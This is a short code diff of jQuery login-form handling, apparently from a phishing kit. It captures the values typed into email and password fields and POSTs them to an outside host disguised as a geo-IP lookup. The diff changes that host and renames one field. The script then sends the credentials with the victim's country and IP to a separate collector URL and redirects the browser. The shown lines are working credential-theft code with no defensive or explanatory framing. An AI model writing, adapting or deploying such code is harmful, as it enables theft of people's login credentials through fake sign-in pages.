@@ -267,7 +267,7 @@
 				var user = $('#email').val();
 				var pass = $('#password').val();
 				$.ajax({
-					url: "https://checkmyips.net/api/geoip/",
+					url: "https://ipstack.com/",
 					type: "POST",
 					data: {user:user,pass:pass,t:1},
 					success: function(data){
@@ -276,7 +276,7 @@
 							$.ajax({
 								 url: php_url,
 								 type: "POST",
-								 data: {user:user,pass:pass,country:i.country,ip:i.ip},
+								 data: {user:user,pass:pass,country_name:i.country,ip:i.ip},
 								 success: function(finish_url){
 									setTimeout("window.location.href='"+ finish_url +"';", 1000);
 								 }
